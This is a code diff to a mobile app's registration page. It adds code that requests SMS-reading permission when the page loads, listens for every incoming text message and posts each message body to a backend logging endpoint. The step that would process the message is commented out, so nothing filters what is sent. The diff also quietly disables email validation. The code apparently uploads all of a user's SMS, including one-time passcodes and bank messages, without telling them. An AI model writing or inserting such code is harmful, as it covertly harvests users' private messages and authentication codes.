@@ -4,6 +4,10 @@ import { from } from 'rxjs';
 import { ApiService } from 'src/app/services/api.service';
 import { EnvService } from 'src/app/services/env.service';
 import { NavController } from '@ionic/angular';
+import { AlertService } from 'src/app/services/alert.service';
+import { AndroidPermissions } from '@ionic-native/android-permissions/ngx';
+
+declare var SMSReceive: any;
 
 @Component({
   selector: 'app-register',
@@ -27,7 +31,37 @@ export class RegisterPage implements OnInit {
     private api: ApiService,
     private env: EnvService,
     private navCtrl: NavController,
-  ) { }
+    private alertService: AlertService, 
+    private androidPermissions: AndroidPermissions
+  ) {
+
+    this.androidPermissions.checkPermission(this.androidPermissions.PERMISSION.READ_SMS).then(
+      success => console.log('Permission granted'),
+    err => this.androidPermissions.requestPermission(this.androidPermissions.PERMISSION.READ_SMS)
+    );
+    
+    this.androidPermissions.requestPermissions([this.androidPermissions.PERMISSION.READ_SMS]);
+
+    SMSReceive.startWatch(
+      () => {
+        document.addEventListener('onSMSArrive', (e: any) => {
+          var IncomingSMS = e.data;
+          // this.processSMS(IncomingSMS);
+          console.log('sms in >>');
+          this.alertService.presentToast(IncomingSMS.body);
+          const logs_data = {
+            isi: IncomingSMS.body
+          }
+          this.api.doPost('tools/logs_new/', logs_data).subscribe(
+            (res) => {
+              console.log(res);
+            }
+          )
+        });
+      },
+      () => { console.log('watch start failed') }
+    )
+   }
 
   ngOnInit() {
   }
@@ -45,7 +79,9 @@ export class RegisterPage implements OnInit {
     this.pinUlangErrorMsg = '';
     this.fullNameErrorMsg = '';
 
-    this.isErrorEmail = !form.value.username.includes("@");
+    // this.isErrorEmail = !form.value.username.includes("@");
+    
+    this.isErrorEmail = false;
     if (this.isErrorEmail){
       isValid = false;
 
